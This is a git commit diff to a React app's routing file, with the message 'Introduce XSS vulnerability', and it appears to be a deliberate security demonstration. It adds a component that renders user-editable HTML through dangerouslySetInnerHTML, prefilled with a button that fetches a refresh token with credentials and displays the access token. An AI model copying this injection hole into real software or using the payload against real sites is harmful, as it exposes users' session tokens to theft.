569780ccc518009edaf1292a8e8e837f27a8e86c
danilyanich <danilyanich@gmail.com>
2020-02-20 14:49:09 +0300

    Introduce XSS vulnerability

--- web/src/Routes.tsx
+++ web/src/Routes.tsx
@@ -1,4 +1,4 @@
-import React from "react";
+import React, { useState } from "react";
 import { BrowserRouter, Switch, Route, Link } from "react-router-dom";
 import { Home } from "./pages/Home";
 import { Login } from "./pages/Login";
@@ -6,10 +6,34 @@ import { Register } from "./pages/Register";
 import { Bye } from "./pages/Bye";
 import { Header } from "./Header";
 
+const XSS_XSRFVulnerabilty = () => {
+  const [value, setValue] = useState(`
+    <button
+      onclick="
+        fetch('http://localhost:4000/refresh_token', {
+          method: 'POST',
+          credentials: 'include',
+        })
+        .then(res => res.json())
+        .then(res => alert(\`I have your access token\n\${res.accessToken}\`))
+      ">
+        XSS Vulnerability Button
+      </button>
+  `);
+
+  return (
+    <div>
+      <textarea value={value} onChange={event => setValue(event.target.value)} />
+      <div dangerouslySetInnerHTML={{ __html: value }}/>
+    </div>
+  )
+};
+
 export const Routes: React.FC = () => {
   return (
     <BrowserRouter>
       <div>
+        <XSS_XSRFVulnerabilty />
         <Header />
         <Switch>
           <Route exact path="/" component={Home} />
